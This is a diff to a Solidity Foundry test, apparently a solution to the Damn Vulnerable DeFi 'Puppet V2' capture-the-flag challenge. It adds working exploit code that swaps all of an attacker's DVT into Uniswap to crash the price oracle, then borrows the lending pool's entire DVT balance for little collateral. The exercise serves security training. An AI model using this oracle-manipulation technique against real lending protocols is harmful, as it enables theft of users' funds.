@@ -104,6 +104,25 @@ contract PuppetV2 is Test {
          * EXPLOIT START *
          */
 
+        // Directly pass the path array
+        address[] memory path = new address[](2);
+        path[0] = address(dvt); // Input token (DVT)
+        path[1] = address(weth); // Output token (WETH)
+
+        vm.startPrank(attacker);
+        // Approve all attacker's DVT balance to UniswapRouter contract.
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        // Swap all DVT tokens with WETH using the UniswapRouter contract.
+        uniswapV2Router.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, attacker, 10_000_000);
+
+        // Get the extra WETH needed by interacting with WETH9 contract
+        weth.deposit{value: 19.6 ether}();
+
+        // Borrow all DVT tokens from pool (~29.5 WETH)
+        weth.approve(address(puppetV2Pool), 29.5 ether);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
